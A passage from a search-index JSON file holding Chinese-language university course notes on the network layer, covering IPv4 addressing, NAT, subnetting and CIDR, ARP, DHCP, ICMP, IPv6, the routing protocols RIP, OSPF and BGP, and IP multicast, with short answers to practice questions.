13\u4f4d\uff0c\u8868\u793a\u8be5\u7247\u5728\u539f\u6570\u636e\u62a5\u4e2d\u7684\u76f8\u5bf9\u4f4d\u7f6e\uff0c\u4ee58B\u4e3a\u5355\u4f4d\uff0c\u56e0\u6b64\u5206\u7247\u7684\u65f6\u5019\u5fc5\u987b\u662f8B\u7684\u6574\u6570\u500d</li> </ul> <p>\u5206\u7ec4\u5206\u7247</p> <p>\u4e0a\u8ff0\u5f88\u591a\u90e8\u5206\u7684\u8bbe\u8ba1\u90fd\u662f\u4e3a\u4e86IP\u62a5\u7684\u5206\u7247\u673a\u5236\uff0cMTU\u8868\u793a\u4e86\u5bf9\u5e94\u94fe\u8def\u7684\u4e00\u4e2a\u6700\u5927\u4f20\u9001\u5355\u5143</p> <p>\u200b\u200b</p> <p>\u200d</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#32-ipv4nat","title":"3.2 IPV4\u548cNAT","text":"<p>\u4e92\u8054\u7f51\u65e9\u671f\u91c7\u7528\u5982\u4e0b\u5206\u7c7b\u7684IP\u5730\u5740\u673a\u5236</p> <p>\u200b\u200b</p> <p>\u9664\u4e86\u4e0a\u8ff0\u5206\u7c7b\u673a\u5236\u4ee5\u5916\uff0c\u6211\u4eec\u8fd8\u5b58\u5728\u4e00\u4e9b\u7279\u6b8a\u7684\u4fdd\u7559\u673a\u5236</p> <ul> <li>\u4e3b\u673a\u53f7\u5168\u4e3a0\u7684\uff0c\u8868\u793a\u672c\u7f51\u7edc\u672c\u8eab</li> <li>\u4e3b\u673a\u53f7\u5168\u4e3a1\u7684\uff0c\u8868\u793a\u8be5\u7f51\u7edc\u7684\u5e7f\u64ad\u5730\u5740</li> <li>127.x.x.x \u7684\u5730\u5740\uff0c\u79f0\u4e3a loopback test \u8868\u793a\u8be5\u4e3b\u673a\u81ea\u8eab</li> <li>32\u4f4d\u5168\u662f0\uff0c\u8868\u793a\u8be5\u7f51\u7edc\u4e0a\u7684\u8be5\u4e3b\u673a</li> <li>32\u4f4d\u5168\u662f1\uff0c\u8868\u793a\u5bf9\u6574\u4e2aTCP/IP \u7f51\u7edc\u7684\u5e7f\u64ad\uff0c\u800c\u5b9e\u9645\u4e0a\u88ab\u9650\u5236\u4e3a\u5bf9\u8be5\u7f51\u7edc\u7684\u5e7f\u64ad</li> </ul> <p>NAT\u673a\u5236</p> <p>NAT\u662f\u5c06\u4e13\u7528\u7684\u7f51\u7edc\u5730\u5740\u8f6c\u6362\u6210\u516c\u7528\u7684\u7f51\u7edc\u5730\u5740\uff0c\u9996\u5148\u5728\u4e0a\u8ff0\u7684\u5206\u7c7b\u4e2d\u5212\u5206\u51fa\u4e86\u4e00\u7cfb\u5217\u7684\u79c1\u6709IP\u5730\u5740\uff0c\u7136\u540e\u901a\u8fc7\u4e00\u4e2a\u8def\u7531\u5668\u5c06\u672c\u7f51\u7edc\u7684\u79c1\u6709\u5730\u5740\u8f6c\u6362\u6210\u516c\u6709\u5730\u5740\u8fdb\u884c\u4ea4\u6d41</p> <p>\u90a3\u4e48\u6211\u4e00\u4e2a\u7f51\u7edc\u7684\u79c1\u6709\u5730\u5740\uff0c\u53ef\u4ee5\u8f6c\u6362\u6210\u4e00\u4e2a\u516c\u6709IP\u8fdb\u884c\u901a\u4fe1</p> <p>\u200b\u200b</p> <p>\u8fd9\u90e8\u5206\u79c1\u6709\u5730\u5740\u53ef\u4ee5\u5728\u5404\u4e2a\u79c1\u6709\u7f51\u7edc\u4e2d\u91cd\u590d\u4f7f\u7528</p> <p>NAT\u5728\u8f6c\u53d1\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u4fee\u6539\u6e90\u5730\u5740</p> <p>\u8def\u7531\u5668\u4e0d\u8f6c\u53d1\u4efb\u4f55\u76ee\u7684\u5730\u5740\u662f\u79c1\u6709\u5730\u5740\u7684\u5305</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#33","title":"3.3 \u5212\u5206\u5b50\u7f51\u548c\u8def\u7531\u805a\u5408","text":"<p>\u5212\u5206\u5b50\u7f51\u5c31\u662f\u5c06\u4e3b\u673a\u53f7\u8fdb\u884c\u518d\u5212\u5206\uff0c\u53d8\u6210\u4e86\u4e09\u7ea7IP\u5730\u5740\uff0c\u7f51\u7edc\u53f7\uff1a\u5b50\u7f51\u53f7\uff1a\u4e3b\u673a\u53f7</p> <p>\u800c\u5b50\u7f51\u63a9\u7801\u5c31\u662f\u8868\u73b0\u4e86\u8fd9\u4e2a\u7f51\u7edc\u7684\u591a\u5c11\u4f4d\u88ab\u5212\u5206\u6210\u4e86\u5b50\u7f51\u53f7\uff0c\u5c06IP\u5730\u5740\u548c\u5b50\u7f51\u63a9\u7801\u6309\u4f4d\u4e0e\uff0c\u5c31\u83b7\u5f97\u4e86\u8fd9\u4e2aIP\u5730\u5740\u7684\u7f51\u7edc\u53f7</p> <p>CIDR</p> <p>CIDR\u662f\u6307\u65e0\u5206\u7c7b\u8def\u7531\u9009\u62e9\uff0c\u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u6d88\u9664\u4e86\u539f\u6709\u7684\u5212\u5206A\u7c7bB\u7c7b\u5730\u5740\uff0c\u518d\u5212\u5206\u5b50\u7f51\u7684\u65b9\u5f0f\uff0c\u76f4\u63a5\u5c06IP\u5730\u5740\u53d8\u4e3a\u7f51\u7edc\u524d\u7f00+\u4e3b\u673a\u53f7</p> <p>CIDR\u91c7\u7528\u659c\u7ebf\u8bb0\u6cd5\uff0c\u4f8b\u5982128.15.32.5/20 \u8868\u793a\u5176\u524d20\u4f4d\u662f\u7f51\u7edc\u524d\u7f00\uff0c\u5176\u6240\u5728\u7684CIDR\u5757\u8868\u73b0\u5982\u4e0b</p> <p>\u200b\u200b</p> <p>\u5f53\u7136\u6211\u4eec\u8981\u6c42\uff0c\u4e00\u822c\u4e3b\u673a\u53f7\u5168\u4e3a0\u548c\u5168\u4e3a1\u7684\u5730\u5740\u4e0d\u4f7f\u7528</p> <p>\u5f53\u6211\u4eec\u6709\u4e00\u4e2aCIDR\u5757\u7684\u65f6\u5019\uff0c\u5982\u679c\u6709\u9700\u8981\uff0c\u8fd8\u53ef\u4ee5\u5411\u4e0b\u5212\u5206\u5b50\u7f51\uff0c\u4ece\u4e3b\u673a\u53f7\u4e2d\u53d6\u51e0\u4f4d\u5373\u53ef</p> <p>\u8def\u7531\u805a\u5408</p> <p>\u5f53\u6211\u4eec\u4f7f\u7528CIDR\u7684\u65f6\u5019\uff0c\u5728\u8def\u7531\u8868\u4e2d\u5e94\u5f53\u9009\u62e9\u6700\u957f\u524d\u7f00\u5339\u914d</p> <p>\u52a8\u6001\u5212\u5206\u5b50\u7f51</p> <p>\u52a8\u6001\u5212\u5206\u5b50\u7f51\u7684\u5173\u952e\u5728\u4e8e\u6bcf\u4e2a\u5206\u914d\u7684\u957f\u5ea6\u4e0d\u4e00\u81f4\uff0c\u5e76\u4e14\u524d\u7f00\u4e5f\u4e0d\u4e00\u81f4</p> <p>\u4f46\u662f\u53ea\u8981\u51fa\u73b0\u4e24\u4e2a\u957f\u5ea6\u4e00\u81f4\u7684\uff0c\u5c31\u4f1a\u5bfc\u81f4\u65e0\u6cd5\u518d\u5212\u5206\u4e0b\u53bb</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#34-arp","title":"3.4 ARP","text":"<ul> <li>\u7f51\u7edc\u5c42\u534f\u8bae</li> </ul> <p>IP\u5305\u771f\u6b63\u4f20\u8f93\u5230\u76ee\u6807\u5c40\u57df\u7f51\u7684\u65f6\u5019\uff0c\u9700\u8981\u8f6c\u6362\u91c7\u7528MAC\u8fdb\u884c\u5bfb\u5740</p> <p>\u56e0\u6b64\u9700\u8981\u6709\u4e00\u4e2a\u534f\u8bae\u628aIP\u8f6c\u6362\u6210ARP\uff0c\u6bcf\u53f0\u673a\u5668\u6709\u4e00\u4e2aARP\u9ad8\u901f\u7f13\u5b58\uff0c\u5f53\u6211\u4eec\u9700\u8981\u4eceA\u4e3b\u673a\u5411B\u4e3b\u673a\u53d1\u5305\u7684\u65f6\u5019\uff0c</p> <ul> <li>\u5148\u67e5\u770bA\u7684ARP\u7f13\u5b58</li> <li>\u82e5\u6ca1\u6709\uff0c\u5219\u7528MAC\u4e3a\u5168\u4e3aF\u7684\u5e27\u8fdb\u884c\u5e7f\u64adARP\uff0c\u6b64\u65f6\u6574\u4e2a\u5c40\u57df\u7f51\u91cc\u7684\u673a\u5668\u90fd\u4f1a\u53d7\u5230\u5305\uff0cB\u82e5\u5728\u8be5\u5c40\u57df\u7f51\u4e2d\uff0c\u5c31\u4f1a\u5411\u4e3b\u673aA\u53d1\u51faARP\u54cd\u5e94\u5206\u7ec4\uff08\u5355\u64ad\u53d1\u9001\uff09</li> <li>\u82e5\u76ee\u6807\u673a\u5668\u4e0d\u5728\u672c\u5c40\u57df\u7f51\u4e2d\uff0c\u6b64\u65f6\u4e3b\u673aA\u627e\u5230\u8def\u7531\u5668\u7684ARP\uff0c\u540e\u9762\u7684\u64cd\u4f5c\u8ba9\u8def\u7531\u5668\u5b8c\u6210\uff08\u540e\u9762\u7684\u6e90\u5730\u5740\u548c\u76ee\u7684\u5730\u5740\u90fd\u6709\u8def\u7531\u5668\u4ee3\u7406\uff09</li> </ul> <p>\u67e5\u8be2ARP\u662f\u5e7f\u64ad\uff0c\u54cd\u5e94\u662f\u5355\u64ad</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#35-dhcp","title":"3.5 DHCP","text":"<p>\u200b\u200b</p> <ul> <li>\u5e94\u7528\u5c42\u534f\u8bae \u57fa\u4e8eUDP</li> </ul> <p>\u52a8\u6001\u4e3b\u673a\u914d\u7f6e\u534f\u8bae\uff0c\u4e3a\u4e3b\u673a\u52a8\u6001\u5730\u914d\u7f6eIP\u5730\u5740\uff0c\u91c7\u7528\u5ba2\u6237/\u670d\u52a1\u5668\u6a21\u578b</p> <ul> <li>\u9700\u8981IP\u5730\u5740\u7684\u4e3b\u673a\u8fdb\u884c\u5e7f\u64ad</li> <li> <p>DHCP\u670d\u52a1\u5668\u53d7\u5230\u7684\u8fd9\u4e2a\u5e7f\u64ad\u5305\u4e4b\u540e\u4f1a\u7ed9\u5176\u53d1\u4e00\u4e2a\u5e94\u7b54\u62a5\u6587</p> </li> <li> <p>\u9996\u5148\u5728\u6570\u636e\u5e93\u4e2d\u627e\u8fd9\u4e2a\u4e3b\u673a\u7684\u914d\u7f6e\u4fe1\u606f</p> </li> <li>\u627e\u4e0d\u5230\u5c31\u4eceIP\u6c60\u91cc\u9762\u627e\u4e00\u4e2aIP\u5730\u5740\u7ed9\u5b83</li> <li>\u5ba2\u6237\u7aef\u8fd4\u56de\u4e00\u4e2a\u786e\u8ba4</li> <li>\u670d\u52a1\u7aef\u8fd4\u56de\u4e00\u4e2a\u786e\u8ba4</li> </ul> <p>\u8fd9\u4e0a\u9762\u7684\u8054\u7cfb\u90fd\u662f\u5e7f\u64ad\u5f62\u5f0f\u505a\u7684\uff0c\u56e0\u4e3a\u6b64\u65f6\u5ba2\u6237\u673a\u8fd8\u6ca1\u6709IP\u5730\u5740</p> <p>DHCP\u5141\u8bb8\u7f51\u7edc\u4e0a\u6709\u591a\u4e2a\u670d\u52a1\u673a\uff0c\u5ba2\u6237\u673a\u53ea\u4f1a\u9009\u62e9\u6700\u65e9\u5230\u8fbe\u7684\u670d\u52a1\u673a\u54cd\u5e94</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#36-icmp","title":"3.6 ICMP*","text":"<ul> <li>\u7f51\u7edc\u5c42\u534f\u8bae</li> </ul> <p>\u662f\u4e3a\u4e86\u8fbe\u5230\u6709\u6548\u8f6c\u53d1IP\u6570\u636e\u5305\u548c\u63d0\u9ad8\u4ea4\u4ed8\u6210\u529f\u7684\u76ee\u7684</p> <p>ICMP\u6709\u4e24\u79cd\u62a5\u6587\uff0c\u5dee\u9519\u62a5\u544a\u62a5\u6587\u548c\u8be2\u95ee\u62a5\u6587</p> <ul> <li>\u5dee\u9519\u62a5\u544a\u6709\u4ee5\u4e0b\u51e0\u79cd\u5f62\u5f0f</li> </ul> <p>\u200b\u200b</p> <ul> <li>Destination unreachable\uff1a\u8def\u7531\u5668\u627e\u4e0d\u5230\u76ee\u6807IP\u5730\u5740\uff0c\u6216\u8005\u6570\u636e\u5305\u7684DF\u4f4d\u88ab\u7f6e1\u4f46\u662f\u5b83\u6bd4\u524d\u9762\u7f51\u7edc\u80fd\u5904\u7406\u7684\u6700\u5927\u5927\u5c0f\u8981\u5927</li> <li> <p>Time exceeded\uff08\u8d85\u65f6\uff09\uff1a\u6570\u636e\u5305\u56e0TTL\uff08\u751f\u5b58\u65f6\u95f4\uff09\u8ba1\u6570\u5668\u8fbe\u5230\u96f6\u800c\u88ab\u4e22\u5f03</p> </li> <li> <p>\u200b<code>traceroute</code>\u200b \u4f1a\u5229\u7528\u8fd9\u4e2a\u7279\u6027\uff0c\u5c06TTL\u4ece1\u5f00\u59cb\u6bcf\u6b21\u9012\u589e1\uff0c\u8fd9\u6837\u8def\u5f84\u4e2d\u6bcf\u4e2a\u8def\u7531\u5668\u90fd\u4f1a\u4f9d\u6b21\u5411\u4e3b\u673a\u53d1\u9001 Time exceeded\u3002</p> </li> <li>Parameter problem\uff1a\u5728\u6570\u636e\u5305\u5934\u90e8\u5b57\u6bb5\u4e2d\u68c0\u6d4b\u5230\u4e86\u975e\u6cd5\u503c</li> <li> <p>Source quench\uff08\u6e90\u6291\u5236\uff09\uff1a\u4e3b\u673a\u6536\u5230\u6b64\u6d88\u606f\u65f6\uff0c\u9884\u671f\u4f1a\u51cf\u6162\u53d1\u9001\u901f\u5ea6\u3002</p> </li> <li> <p>\u7531\u4e8e\u4f1a\u4f7f\u62e5\u585e\u66f4\u4e25\u91cd\uff0c\u76ee\u524d\u4e0d\u4f1a\u4f7f\u7528\u5b83\u3002</p> </li> <li>\u73b0\u5728\u62e5\u585e\u63a7\u5236\u4e3b\u8981\u5728\u4f20\u8f93\u5c42\u8fdb\u884c\uff0c\u4f7f\u7528\u6570\u636e\u5305\u4e22\u5931\u4f5c\u4e3a\u62e5\u585e\u4fe1\u53f7\u3002</li> <li> <p>Redirect\uff08\u91cd\u5b9a\u5411\uff09\uff1a\u8def\u7531\u5668\u4f7f\u7528\u6b64\u6d88\u606f\u544a\u8bc9\u53d1\u9001\u4e3b\u673a\uff0c\u6570\u636e\u5305\u88ab\u9519\u8bef\u8def\u7531\uff0c\u5e94\u8be5\u66f4\u65b0\u5230\u66f4\u597d\u7684\u8def\u7531\u3002</p> </li> <li> <p>\u5b58\u5728\u4e00\u4e9b\u60c5\u51b5\uff0c\u4e0d\u5e94\u8be5\u53d1\u9001\u5dee\u9519\u62a5\u6587</p> </li> </ul> <p>\u200b\u200b</p> <ul> <li>\u8be2\u95ee\u62a5\u6587\u67094\u79cd\uff0c\u56de\u9001\u8bf7\u6c42\u548c\u56de\u7b54\u62a5\u6587\uff0c\u65f6\u95f4\u6233\u8bf7\u6c42\u548c\u56de\u7b54\u62a5\u6587\uff0c\u5730\u5740\u63a9\u7801\u8bf7\u6c42\u548c\u56de\u7b54\u62a5\u6587\uff0c\u8def\u7531\u5668\u8be2\u95ee\u548c\u901a\u544a\u62a5\u6587</li> </ul> <p>ICMP\u7684\u5e94\u7528</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#37","title":"3.7 \u4e60\u9898\u6536\u5f55","text":"<p>\u200b\u200b</p> <ul> <li>B \u6700\u957f\u524d\u7f00\u5339\u914d</li> </ul> <p>\u200b\u200b</p> <ul> <li>A\uff0cB\u4e3a\u79c1\u6709\u5730\u5740\uff08A\u7c7b\u5730\u5740\u7684\u5e7f\u64ad\uff09\uff0cC\u79c1\u6709\u5730\u5740\uff08CIDR\u7684\u5e7f\u64ad\uff09\uff0cD\u662fD\u7c7b\u591a\u64ad\u5730\u5740</li> </ul> <p>\u200b\u200b</p> <ul> <li>B\uff0cA\u4e3aC\u7c7b\u5730\u5740\uff0c\u4e3b\u673a\u53f7\u5168\u4e3a0\uff0cC\u662f\u56de\u73af\u5730\u5740\uff0cD\u8bed\u6cd5\u9519\u8bef\uff0c256&gt;255</li> </ul> <p>\u200b\u200b</p> <ul> <li>A \u53ea\u6709NAT\u4f1a\u6539\u53d8\u6e90\u5730\u5740\u548c\u76ee\u7684\u5730\u5740</li> </ul> <p>\u200b\u200b</p> <ul> <li>A \u67095\u4f4d\u7684\u53ef\u64cd\u4f5c\u7a7a\u95f4\uff0c\u6700\u591a\u5212\u52063\u4f4d\u7ed9\u5b50\u7f51\uff0c\u4e3b\u673a\u53f7\u6700\u5c11\u8981\u7559\u51fa\u4e24\u4f4d\uff0c\u5426\u5219\u5c31\u53ea\u6709\u51680\u548c\u51681</li> </ul> <p>\u200b\u200b</p> <ul> <li>A</li> </ul> <p>\u200b\u200b</p> <ul> <li>B \u672c\u7f51\u7edc\u4e00\u6b21 + N\u4e2a\u8def\u7531\u5668N\u6b21</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>D \u4f7f\u7528\u8def\u7531\u805a\u5408</li> </ul> <p>\u200b\u200b</p> <ul> <li>A \u5728DHCP\u4e2d\uff0c0.0.0.0\u5c31\u7528\u4f5c\u6e90IP\u5730\u5740</li> </ul> <p>\u200b\u200b</p> <ul> <li>D \u5168\u7531\u8def\u7531\u5668\u8fdb\u884c\u4ee3\u7406</li> </ul> <p>\u200b\u200b</p> <ul> <li>BB \u52a8\u6001\u5206\u914d\u8def\u7531</li> <li>PING\u662f\u7528\u7684\u662fICMP\u8be2\u95ee\u62a5\u6587</li> <li>Tracert \u4f7f\u7528 ICMP \u8d85\u65f6\u62a5\u6587 \u5dee\u9519\u62a5\u6587</li> <li>ICMP\u6570\u636e\u5305\u653e\u7f6e\u5728IP\u6570\u636e\u5305\u7684 payload \u4e2d\uff0cIP\u6570\u636e\u62a5\u7684 protocol \u5b57\u6bb5\u4e3a1\uff0c\u6307\u793a\u5b83\u662fICMP\u6570\u636e\u5305\u3002</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#4-ipv6","title":"4. IPV6","text":"<p>IPv4\u5730\u5740\u5230\u73b0\u5728\u5df2\u7ecf\u57fa\u672c\u88ab\u8017\u5c3d\uff0c\u6211\u4eec\u9700\u8981\u8f6c\u5411\u66f4\u65b0\u7684IPV6</p> <p>IP\u7684\u5730\u5740\u4ece 32 \u4f4d \u5230\u4e86 128 \u4f4d</p> <p>IPv6\u7684\u8bbe\u8ba1\u6709\u4ee5\u4e0b\u7279\u70b9</p> <ul> <li>\u9996\u90e8\u957f\u5ea6\u56fa\u5b9a\uff0c\u53ef\u9009\u90e8\u5206\u653e\u5728\u6709\u6548\u8f7d\u8377\u91cd</li> <li>\u652f\u6301\u5373\u63d2\u5373\u7528\uff0c\u4e0d\u9700\u8981DHCP</li> <li>\u652f\u6301\u8d44\u6e90\u7684\u9884\u5206\u914d\uff0c\u5305\u62ec\u5b9e\u65f6\u97f3\u89c6\u9891\u7684\u8981\u6c42</li> <li>IPv6\u53ea\u6709\u4e3b\u673a\u624d\u80fd\u5206\u7247\uff0c\u662f\u7aef\u5230\u7aef\uff0c\u4e0d\u5141\u8bb8\u4e2d\u95f4\u8def\u7531\u5668\u7684\u5206\u7247</li> <li>\u589e\u52a0\u4e86\u5b89\u5168\u6027</li> </ul> <p>IPv6\u548cIPv4\u4e0d\u517c\u5bb9\uff0c\u4f46\u662f</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#41","title":"4.1 \u5206\u7ec4","text":"<p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#42-ipv6","title":"4.2 IPv6\u5730\u5740","text":""},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#43-ipv4ipv6","title":"4.3 \u4eceIPv4\u5411IPv6\u8fc7\u6e21","text":"<ul> <li>\u53cc\u534f\u8bae\u6808\uff0c\u5728\u540c\u4e00\u53f0\u673a\u5668\u4e0a\u914d\u7f6e\u4e24\u4e2a\u534f\u8bae\u6808</li> <li>\u96a7\u9053\u6280\u672f tunneling\uff0c\u5c06\u6574\u4e2aIPv6\u6570\u636e\u62a5\u5305\u88c5\u6210IPv4\u6570\u636e\u62a5\u7684\u6570\u636e\u90e8\u5206\uff0c\u5f53\u5176\u79bb\u5f00IPv4\u7f51\u7edc\u7684\u65f6\u5019\uff0c\u8f6c\u4ea4\u7ed9IPv6\u7f51\u7edc</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#5","title":"5. \u8def\u7531\u534f\u8bae","text":"<p>\u6574\u4e2a\u4e92\u8054\u7f51\u91c7\u7528\u7684\u5206\u5c42\u6b21\u7684\u8def\u7531\u534f\u8bae\uff0c\u73b0\u5c06\u5176\u5212\u5206\u6210\u4e00\u4e2a\u4e2a\u5c0f\u7684\u81ea\u6cbb\u7cfb\u7edf\uff1aAS\uff0c\u5728\u81ea\u6cbb\u7cfb\u7edf\u91cc\u53ef\u4ee5\u9009\u62e9\u5404\u79cd\u534f\u8bae\uff0c\u6210\u4e3a\u5185\u90e8\u7f51\u5173\u534f\u8baeIGP\uff0c\u800cAS\u548cAS\u4e4b\u95f4\u5219\u662f\u91c7\u7528\u5916\u90e8\u7f51\u5173\u534f\u8bae\uff0c\u79f0\u4e3aEGP</p> <ul> <li> <p>IGP</p> </li> <li> <p>RIP\u548cOSPF</p> </li> <li> <p>EGP</p> </li> <li> <p>BGP-4</p> </li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#51-rip","title":"5.1 RIP","text":"<ul> <li>\u5e94\u7528\u5c42\u534f\u8bae \u4f7f\u7528\u7684\u662fUDP</li> </ul> <p>RIP\u4e2d\u7684\u8def\u7531\u5668\u7ef4\u62a4\u8fd9\u6837\u4e00\u4e2a\u8868\u9879</p> <ul> <li>\u76ee\u7684\u7f51\u7edc\uff0c\u8ddd\u79bb\uff0c\u4e0b\u4e00\u8df3\u8def\u7531\u5730\u5740</li> </ul> <p>RIP\u4f7f\u7528\u8df3\u6570\u6765\u63cf\u8ff0\u5230\u8fbe\u76ee\u6807\u7f51\u7edc\u7684\u8ddd\u79bb\uff0c\u4e5f\u5c31\u662f\u8981\u7ecf\u8fc7\u7684\u8def\u7531\u5668\u7684\u6570\u91cf\uff0c\u8def\u7531\u5668\u521a\u5f00\u59cb\u5de5\u4f5c\u7684\u65f6\u5019\uff0c\u5176\u53ea\u77e5\u9053\u76f8\u90bb\u8def\u7531\u5668\u7684\u8ddd\u79bb\u4e3a1\uff0c\u5176\u4f1a\u8ddf\u76f8\u90bb\u7684\u8def\u7531\u5668\u5468\u671f\u6027\u5730\u8fdb\u884c\u4ea4\u6362\uff0c\u5e76\u66f4\u65b0\u8def\u7531\u4fe1\u606f\uff0c\u6700\u7ec8\u8fbe\u5230\u6536\u655b</p> <ul> <li>\u66f4\u65b0\u6b65\u9aa4\u5982\u4e0b</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#52-ospf","title":"5.2 OSPF","text":"<ul> <li>\u7f51\u7edc\u5c42\u534f\u8bae\uff0c\u57fa\u4e8eIP\uff0c\u534f\u8bae\u5b57\u6bb5\u4e3a89</li> </ul> <p>OSPF\u5411\u672cAS\u7684\u6240\u6709\u8def\u7531\u5668\u90fd\u53d1\u9001\u4fe1\u606f\uff0c\u7528\u6d2a\u6cdb\u6cd5\uff0c\u53d1\u9001\u7684\u4fe1\u606f\u662f\u81ea\u5df1\u548c\u76f8\u90bb\u8def\u7531\u5668\u7684\u94fe\u8def\u72b6\u6001\u3002\u53ea\u6709\u5f53\u76f8\u90bb\u8def\u7531\u5668\u7684\u94fe\u8def\u72b6\u6001\u53d1\u751f\u53d8\u5316\u4e86\uff0c\u624d\u4f1a\u53d1\u9001\u4fe1\u606f</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#53-bgp","title":"5.3 BGP","text":"<ul> <li>\u5e94\u7528\u5c42\u534f\u8bae \u57fa\u4e8eTCP</li> </ul> <p>\u6bcf\u4e2aAS\u9700\u8981\u9009\u62e9\u4e00\u4e2a\u8def\u7531\u5668\u4f5c\u4e3a\u8be5AS\u7684BGP\u53d1\u8a00\u4eba\uff0cBGP\u8fb9\u754c\u8def\u7531\u5668</p> <ul> <li>BGP\u53d1\u8a00\u4eba\u8981\u548c\u5176\u4ed6\u7684BGP\u53d1\u8a00\u4eba\u4ea4\u6362\u8def\u7531\u4fe1\u606f\uff0c\u9996\u5148\u8981\u5efa\u7acbTCP\u8fde\u63a5\uff0c\u7136\u540e\u518d\u4e0a\u9762\u5efa\u7acbBGP\u5bf9\u8bdd</li> <li>BGP\u53d1\u8a00\u4eba\u4f1a\u4ea4\u6362\u7f51\u7edc\u53ef\u8fbe\u6027\u4fe1\u606f\uff0c\u8fd9\u4e2a\u53ef\u8fbe\u6027\u4fe1\u606f\u662f\u8fbe\u5230\u67d0\u4e2a\u7f51\u7edc\u8981\u7ecf\u8fc7\u7684\u4e00\u7cfb\u5217\u81ea\u6cbb\u7cfb\u7edf</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#_2","title":"\u4e60\u9898","text":"<p>\u200b\u200b</p> <ul> <li>C \u5bf9\u4e8e\u591a\u5206\u7ec4\u7684\u8f6c\u53d1\u65f6\u5ef6\u95ee\u9898\uff0c\u7b2c\u4e00\u4e2a\u5206\u7ec4\u5403\u6ee1\u65f6\u5ef6\uff0c\u4e4b\u540e\u7684\u5206\u7ec4\u53ea\u8981\u5403\u4e00\u4e2a\u65f6\u5ef6\u5373\u53ef</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#6-ip","title":"6. IP \u591a\u64ad","text":"<p>IP\u591a\u64ad\uff0c\u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u4e00\u5bf9\u591a\u7684\u901a\u4fe1\uff0c\u6e90\u4e3b\u673a\u53ea\u9700\u8981\u53d1\u9001\u4e00\u4efd\u6d88\u606f\uff0c\u4ec5\u5728\u51fa\u73b0\u5206\u53c9\u7684\u65f6\u5019\u8fdb\u884c\u590d\u5236\u8f6c\u53d1</p> <p>\u80fd\u591f\u8fd0\u884c\u591a\u64ad\u7684\u8def\u7531\u5668\u79f0\u4e3a\u591a\u64ad\u8def\u7531\u5668</p> <p>\u591a\u64ad\u5730\u5740</p> <p>\u591a\u64ad\u5730\u5740\u5176\u5b9e\u524d\u9762\u4e5f\u6d89\u53ca\u8fc7\uff0c\u5c31\u662fD\u7c7b\u5730\u5740 224.0.0.0 \u5230 239.255.255.255\uff0c\u8be5\u5730\u5740\u6807\u5fd7\u4e00\u4e2a\u591a\u64ad\u7ec4\uff0c\u4e00\u4e2a\u4e3b\u673a\u53ef\u4ee5\u52a0\u5165\u6216\u79bb\u5f00\u8fd9\u4e2a\u591a\u64ad\u7ec4</p> <p>IP\u7684\u9996\u90e8\u4e2d\u4f1a\u4f7f\u7528\u534f\u8bae\u5b57\u6bb5\u4e3a2\uff0c\u8868\u793a\u4f7f\u7528IGMP\u534f\u8bae</p> <ul> <li>\u5bf9\u4e8e\u591a\u64ad\u4e0d\u4ea7\u751fICMP\u5dee\u9519\u62a5\u6587</li> <li>\u591a\u64ad\u53ea\u9488\u5bf9UDP\uff0cTCP\u662f\u4e00\u5bf9\u4e00\u7684\u8fde\u63a5</li> </ul> <p>\u5c40\u57df\u7f51\u4e2d\u786c\u4ef6\u591a\u64ad</p> <p>\u4f7f\u7528MAC\u591a\u64ad\u5730\u5740\u8fdb\u884c\u591a\u64ad\u5373\u53ef</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u5728\u5904\u7406\u7684\u65f6\u5019\uff0c\u5c06IP\u5730\u5740\u7684\u540e23\u4f4d\u8f6c\u6362\u6210MAC\u7684\u540e23\u4f4d</p> <p>\u56e0\u4e3a\u8fd9\u4e2a\u5bf9\u5e94\u5173\u7cfb\u4e0d\u662f\u4e00\u4e00\u5bf9\u5e94\u7684\uff0c\u4f1a\u6709\u591a\u4e2aIP\u591a\u64ad\u5730\u5740\u6620\u5c04\u5230\u540c\u4e00\u4e2aMAC\u591a\u64ad\u5730\u5740\uff0c\u56e0\u6b64\u8fd8\u4f1a\u5728IP\u5c42\u505a\u4e00\u5c42\u8fc7\u6ee4</p> <p>IGMP</p> 